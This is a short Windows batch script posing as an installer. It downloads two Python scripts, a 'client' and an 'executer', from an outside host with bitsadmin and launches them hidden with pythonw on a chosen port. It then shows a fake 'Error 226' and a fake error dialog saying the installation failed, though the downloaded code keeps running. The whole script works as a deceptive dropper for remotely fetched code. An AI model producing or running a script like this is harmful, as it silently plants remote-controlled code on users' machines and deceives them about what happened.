@echo off
set /p port="Enter port: "
py -m pip install win10toast
py -m pip install requests
echo Please wait while we proccess the installation.
mkdir C:\pycm
cd C:\pycm
echo Starting Download
bitsadmin /transfer wcb /priority high http://langunity.net/pycm/clientv2.py C:\pycm\clientv2.py
bitsadmin /transfer wcb /priority high http://langunity.net/pycm/executer.py C:\pycm\executer.py
echo Done! Starting!
echo Oops! Error 226!
cd C:\pycm
del /f start.cmd
echo cd C:\pycm >> ./start.cmd
echo pythonw.exe executer.py start %port% >> ./start.cmd
C:\pycm\start.cmd
PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Something went wrong during the installation. Please contact a system administrator or developer.')"